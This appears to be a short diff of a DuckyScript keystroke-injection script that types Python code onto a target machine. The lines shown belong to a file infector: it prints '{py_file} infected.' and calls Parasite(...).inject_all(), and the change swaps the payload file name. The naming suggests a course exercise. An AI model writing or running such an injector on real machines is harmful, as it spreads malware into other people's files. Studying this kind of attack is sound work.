@@ -133,7 +133,7 @@ STRING                 if injection_status == 0:
 ENTER
 STRING                     print(f"{py_file} infected.")
 ENTER
-STRING Parasite(output_path="Q1C.out", payload_file="Q1_payload.py").inject_all()
+STRING Parasite(output_path="Q1C.out", payload_file="Q1C_payload.py").inject_all()
 ENTER
 CTRL s
 DELAY 300
